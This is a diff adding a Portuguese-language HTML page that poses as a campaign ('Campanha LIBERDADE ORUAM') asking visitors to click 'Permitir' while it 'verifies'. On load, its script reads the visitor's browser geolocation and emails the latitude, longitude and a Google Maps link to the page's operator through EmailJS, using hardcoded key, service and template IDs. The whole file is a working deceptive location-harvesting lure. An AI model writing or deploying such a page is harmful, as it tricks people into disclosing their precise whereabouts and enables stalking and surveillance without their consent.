@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <title>Campanha LIBERDADE ORUAM</title>
+</head>
+<body>
+  <h1>🚨 Clique em "Permitir" para visualizar</h1>
+  <p>Estamos verificando...</p>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("JhupoMugVJep2G1lC"); // ⬅️ Coloque aqui seu Public Key do EmailJS
+    })();
+
+    function enviarEmail(lat, lon) {
+      const templateParams = {
+        latitude: lat,
+        longitude: lon,
+        link_google_maps: `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`
+      };
+
+      emailjs.send("service_jcgmsga", "template_6v7nxkc", templateParams)
+        .then(function(response) {
+          document.body.innerHTML = "<h2>✅ Obrigado!</h2>";
+        }, function(error) {
+          document.body.innerHTML = "<h2>❌ Deu erro.</h2>";
+          console.log(error);
+        });
+    }
+
+    function obterLocalizacao() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            enviarEmail(lat, lon);
+          },
+          (error) => {
+            document.body.innerHTML = "<h2>❌ Deu erro.</h2>";
+          }
+        );
+      } else {
+        document.body.innerHTML = "<h2>❌ Deu Erro.</h2>";
+      }
+    }
+
+    obterLocalizacao();
+  </script>
+</body>
+</html>
